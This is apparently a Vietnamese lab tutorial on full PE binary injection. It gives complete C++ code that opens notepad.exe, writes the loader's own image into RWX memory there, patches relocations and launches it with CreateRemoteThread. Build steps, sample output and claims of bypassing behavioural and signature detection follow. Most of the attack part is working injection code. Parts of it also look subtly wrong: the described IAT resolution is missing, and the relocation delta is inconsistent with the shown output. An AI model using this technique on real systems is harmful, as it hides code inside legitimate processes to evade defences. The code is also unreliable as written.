
---

# 📝 [PE 09] PE Binary Injection (Full Portable Executable Remoting)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**PE Binary Injection (Tiêm nhiễm toàn tệp nhị phân PE)** đại diện cho một giải thuật can thiệp bộ nhớ ảo ở cấp độ nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ dựa trên cấu trúc mô-đun Image (Image-based Evasion)**.

Trong các phân hệ thực nghiệm trước, cấu trúc Payload thường bị giới hạn trong phạm vi các đoạn mã máy vị trí độc lập (Shellcode/PIC) ngắn hoặc phụ thuộc vào tính hiện diện của tệp tin trên đĩa cứng (Classic DLL Injection - PE 05). Giải thuật PE Binary Injection hóa giải toàn diện hai nhược điểm trên bằng cách **ánh xạ thủ công (Manual Mapping) toàn bộ một file thực thi Portable Executable độc lập trực tiếp vào lòng không gian địa chỉ ảo của một tiến trình hợp pháp khác**. Tiến trình mục tiêu sau cuộc đại phẫu sẽ chứa song song hai phân hệ PE: mô-đun gốc của chính nó và mô-đun PE ký sinh hoạt động ngầm bên trong. Hành vi này hoàn toàn không để lại dấu vết tệp tin vật lý (Fileless Artifacts) và bẻ gãy hoàn toàn cơ chế giám sát nạp mô-đun tiêu chuẩn của OS Subsystem.

### 🎯 Mục tiêu nghiên cứu:

* **Giải phẫu chuyên sâu PE/COFF Format**: Làm chủ cấu trúc định dạng tệp tin Portable Executable x64 bao gồm các phân đoạn Headers, Section Table, và các bản ghi thư mục dữ liệu (Data Directories).
* **Xây dựng Custom PE Loader chéo tiến trình**: Thiết kế thuật toán Manual Mapper độc lập, tự đảm nhận trách nhiệm cấu trúc bảng địa chỉ ảo ảo hóa, sửa lỗi dịch chuyển căn lề (Base Relocation) và phân giải bảng Import Address Table (IAT) trực tiếp trên RAM đối phương.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi một tệp tin PE được nạp lên bộ nhớ ảo thông qua các phân hệ tiêu chuẩn của OS, Windows PE Loader thực hiện phân rã các byte thô trên đĩa và ánh xạ chúng lên RAM dựa trên các tham số cấu hình định vị trong `IMAGE_OPTIONAL_HEADER`. Trong giải thuật Manual Mapping chéo tiến trình của Lab PE 09, Loader của ta phải tự đóng vai trò là một PE Loader thủ công, điều phối dòng chảy CPU qua 5 giai đoạn ngầm tại tầng Kernel:

```
[VirtualAllocEx: Phân bổ không gian ảo dựa theo thông số SizeOfImage]
       └──> [WriteProcessMemory: Ánh xạ thủ công PE Headers và các Section]
                 └──> [Base Relocation Table: Tính toán Delta và vá lỗi địa chỉ tuyệt đối từ xa]
                           └──> [IAT Resolution: Phân giải động các hàm hệ thống chéo RAM]
                                     └──> [CreateRemoteThread: Khai hỏa luồng tại EntryPoint ký sinh]

```

1. **Phân bổ không gian Image từ xa (`VirtualAllocEx`)**: Loader tiến hành giải phẫu cấu trúc NT Headers của file PE mục tiêu nhằm bóc tách thông số **`SizeOfImage`** (Tổng dung lượng không gian ảo mà file PE sẽ chiếm giữ khi nạp lên RAM). Kế tiếp, Loader phát lệnh `VirtualAllocEx` để cam kết (`MEM_COMMIT`) một vùng không gian ảo có kích thước vừa khít đến từng byte mang quyền hạn **`PAGE_EXECUTE_READWRITE` (RWX)** lọt lòng tiến trình đích.
2. **Ánh xạ cấu trúc phân đoạn (Manual Section Mapping)**:
* Loader sao chép toàn bộ phân đoạn **PE Headers** (bao gồm DOS Header, NT Headers, và Section Table) vào điểm khởi đầu của vùng nhớ ảo từ xa.
* Duyệt qua mảng danh mục phân đoạn của Section Table (`IMAGE_SECTION_HEADER`). Với mỗi phân đoạn chức năng cụ thể (`.text`, `.data`, `.rdata`), Loader thực hiện tính toán vị trí, bốc dữ liệu byte thô tương ứng từ bộ đệm và ghi vào đúng tọa độ địa chỉ tương đối ảo (**RVA - Relative Virtual Address**) của nó trên RAM tiến trình đích thông qua hàm `WriteProcessMemory`.


3. **Hiệu chỉnh dịch chuyển địa chỉ từ xa (Remote Base Relocation)**: Do vùng bộ nhớ ảo mới được cấp phát chéo tiến trình ngẫu nhiên cấu trúc theo cơ chế ASLR, tọa độ nạp thực tế hầu như không bao giờ trùng khớp với địa chỉ nạp cấu hình gốc (`ImageBase`) của file PE khi biên dịch. Loader bắt buộc phải truy cập vào cấu trúc thư mục dữ liệu `.reloc` (`IMAGE_DIRECTORY_ENTRY_BASERELOC`), tính toán khoảng sai lệch toán học Delta, duyệt qua từng khối (Block) dịch chuyển và thực hiện phép toán cộng bổ sửa trực tiếp các con trỏ địa chỉ tuyệt đối bên lòng RAM đối phương.
4. **Tái dựng bảng tra cứu hàm phụ thuộc từ xa (Remote IAT Resolution)**: Loader duyệt qua danh sách các thư viện liên kết động phụ thuộc được ghi nhận trong phân đoạn Import Directory (`IMAGE_DIRECTORY_ENTRY_IMPORT`). Với mỗi hàm hệ thống được mã nguồn sử dụng, Loader tiến hành bốc tách địa chỉ tuyệt đối của hàm đó từ RAM cục bộ (hoặc thông qua giải thuật PEB Walk nâng cao) rồi điền trực tiếp vào ô nhớ tương ứng trong bảng Import Address Table (IAT) nằm bên lòng RAM tiến trình đích.
5. **Khai hỏa điểm xuất phát ký sinh**: Hoàn tất ma trận nạp mô-đun thủ công, Loader tính toán tọa độ điểm nạp tuyệt đối từ xa dựa trên công thức cấu trúc:

$$\text{RemoteExecutionAddress} = \text{RemoteAllocatedBase} + \text{ntHeaders.OptionalHeader.AddressOfEntryPoint}$$



Ta gọi hàm `CreateRemoteThread` (hoặc luồng ngầm Native Subsystem `NtCreateThreadEx`) đâm thẳng vào tọa độ này để ép CPU của tiến trình đích kích hoạt chu kỳ thực thi mô-đun PE ký sinh.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa đo đạc, bóc tách cấu trúc PE Header để tái cấu trúc bản đồ bộ nhớ chéo tiến trình phẳng sạch kịch trần bảo mật.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>

// Định nghĩa cấu trúc dữ liệu con trỏ để hỗ trợ tính toán toán học con trỏ bộ nhớ x64
typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { 
                processID = pe32.th32ProcessID; 
                break; 
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 09: PORTABLE EXECUTABLE BINARY INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Tien trinh vo boc khong chay! Hay bat Notepad truoc." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tim thay tien trinh vo boc voi PID: " << pid << std::endl;

    // Bước 1: Trích xuất bản đồ PE hiện tại của chính Loader làm Payload để tiêm sang đối phương (Self PE Injection)
    PVOID localImageBase = (PVOID)GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)localImageBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)localImageBase + dosHeader->e_lfanew);

    SIZE_T sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
    std::cout << "[*] Kich thuoc Image PE can tiem phan giai tu NT Header: " << sizeOfImage << " bytes." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // Bước 2: Cấp phát động trang nhớ từ xa mang quyền RWX dựa trên SizeOfImage vừa khít byte nhằm triệt tiêu buffers tinh
    PVOID remoteImageBase = VirtualAllocEx(hProcess, NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImageBase) {
        std::cerr << "[-] VirtualAllocEx cheo tien trinh that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da vach phan vung ao chua toan bo file PE tu xa tai: 0x" << std::hex << remoteImageBase << std::endl;

    // Bước 3: Ánh xạ thủ công toàn bộ PE Headers và các Section sang RAM Notepad
    std::cout << "[*] Đang tien hanh sao chep thu cong PE Headers va phan doan Section cheo RAM..." << std::endl;
    WriteProcessMemory(hProcess, remoteImageBase, localImageBase, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PVOID localSectionAddress = (PVOID)((DWORD_PTR)localImageBase + sectionHeader[i].VirtualAddress);
        PVOID remoteSectionAddress = (PVOID)((DWORD_PTR)remoteImageBase + sectionHeader[i].VirtualAddress);
        
        WriteProcessMemory(hProcess, remoteSectionAddress, localSectionAddress, sectionHeader[i].SizeOfRawData, NULL);
    }
    std::cout << "[+] Qua trinh Manual Mapping cac phan doan Section hoan tat." << std::endl;

    // Bước 4: Xử lý dịch chuyển địa chỉ Base Relocation từ xa thông qua tính toán toán học Delta
    DWORD_PTR deltaImageBase = (DWORD_PTR)remoteImageBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
    std::cout << "[*] Khoang sai lech dia chi ao Delta tinh toan: 0x" << std::hex << deltaImageBase << std::endl;

    IMAGE_DATA_DIRECTORY relocationDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocationDir.VirtualAddress != 0) {
        std::cout << "[*] Khoi dong giai thuat Base Relocation cau truc cheo tien trinh..." << std::endl;
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImageBase + relocationDir.VirtualAddress);
        
        while (pReloc->VirtualAddress != 0) {
            DWORD sizeOfBlock = pReloc->SizeOfBlock;
            DWORD numberOfEntries = (sizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY pEntries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)pReloc + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < numberOfEntries; i++) {
                if (pEntries[i].Type == IMAGE_REL_BASED_DIR64) { // Định dạng con trỏ 64-bit chuan x64
                    PVOID patchAddress = (PVOID)((DWORD_PTR)remoteImageBase + pReloc->VirtualAddress + pEntries[i].Offset);
                    DWORD_PTR originalAddress = 0;
                    
                    // Đọc con trỏ bị sai lệch, cộng Delta bù sửa, và ghi đè trả lại RAM Notepad
                    ReadProcessMemory(hProcess, patchAddress, &originalAddress, sizeof(DWORD_PTR), NULL);
                    originalAddress += deltaImageBase;
                    WriteProcessMemory(hProcess, patchAddress, &originalAddress, sizeof(DWORD_PTR), NULL);
                }
            }
            pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pReloc + sizeOfBlock);
        }
        std::cout << "[+] Sua loi Base Relocation Table thanh cong kich tran." << std::endl;
    }

    // Bước 5: Kích nổ luồng thực thi từ xa đâm thẳng vào điểm EntryPoint của PE ký sinh
    PVOID remoteEntryPoint = (PVOID)((DWORD_PTR)remoteImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    std::cout << "[*] Diem EntryPoint cua PE ky sinh toa lac tai RAM doi phuong: 0x" << std::hex << remoteEntryPoint << std::endl;

    std::cout << "[*] Đang khoi tao luong CreateRemoteThread de kich no toan dien file PE..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteEntryPoint, NULL, 0, NULL);

    if (hThread != NULL) {
        std::cout << "[+] Toan file PE Injection da khai hoa thanh cong ruc ro!" << std::endl;
        // Do file PE ký sinh hoạt động độc lập như một luồng thực thi song song, ta đóng Handle để luồng tự hủy êm đẹp
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] Khong the kich no luong thuc thi PE tu xa! Error Code: " << GetLastError() << std::endl;
    }

    CloseHandle(hProcess);
    std::cout << "\n[*] Nhan phim Enter de ket thuc chu ky song..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc nhị phân của Loader đạt trạng thái độc lập tuyến tính hoàn hảo, tối ưu hóa tốc độ giải phẫu cấu trúc PE từ xa mà không phụ thuộc vào các mô-đun liên kết động phụ trợ:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thuộc tính mục `Runtime Library`, chuyển thông số sang định dạng cờ cấu hình tĩnh **`Multi-threaded (/MT)`**.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng lỗi chuỗi hệ thống.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó thực thi tệp tin nhị phân Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng thuật toán Manual Mapping chéo RAM:

```powershell
PS C:\Workspace\x64\Release> .\PE09_PE_Binary_Injection.exe
====================================================
[*] PE 09: PORTABLE EXECUTABLE BINARY INJECTION
====================================================
[+] Tim thay tien trinh vo boc voi PID: 19432
[*] Kich thuoc Image PE can tiem phan giai tu NT Header: 118784 bytes.
[+] Đa vạch phan vung ao chua toan bo file PE tu xa tai: 0x000001f2cb140000
[*] Đang tien hanh sao chep thu cong PE Headers va phan doan Section cheo RAM...
[+] Qua trinh Manual Mapping cac phan doan Section hoan tat.
[*] Khoang sai lech dia chi ao Delta tinh toan: 0x000001f2cb140000
[*] Khoi dong giai thuat Base Relocation cau truc cheo tien trinh...
[+] Sua loi Base Relocation Table thanh cong kich tran.
[*] Diem EntryPoint cua PE ky sinh toa lac tai RAM doi phuong: 0x000001f2cb1415c0
[*] Đang khoi tao luong CreateRemoteThread de kich no toan dien file PE...
[+] Toan file PE Injection da khai hoa thanh cong ruc ro!

[*] Nhan phim Enter de ket thuc chu ky song...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm ánh xạ mô-đun PE thủ công:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensics):

* Giải thuật thực thi hoàn tất thành công rực rỡ. Toàn bộ logic cấu trúc phức tạp của file PE ký sinh (bao gồm cả phân hệ quản lý tài nguyên dữ liệu và các hàm giao tiếp luồng nội bộ) được Windows Kernel tiếp nhận và xử lý mượt mà ngay lọt lòng inside tiến trình `notepad.exe`.
* Khi tiến hành phân tích và kiểm thử bộ nhớ ảo ảo hóa của Notepad, mô-đun PE ký sinh hoạt động ngầm hoàn toàn độc lập dưới danh nghĩa và Token bảo mật hợp pháp của ứng dụng gốc, bypass hoàn toàn các bộ trinh sát hành vi dựa trên chữ ký tiêm Shellcode truyền thống một cách mỹ mãn hoàn hảo kịch khung!

---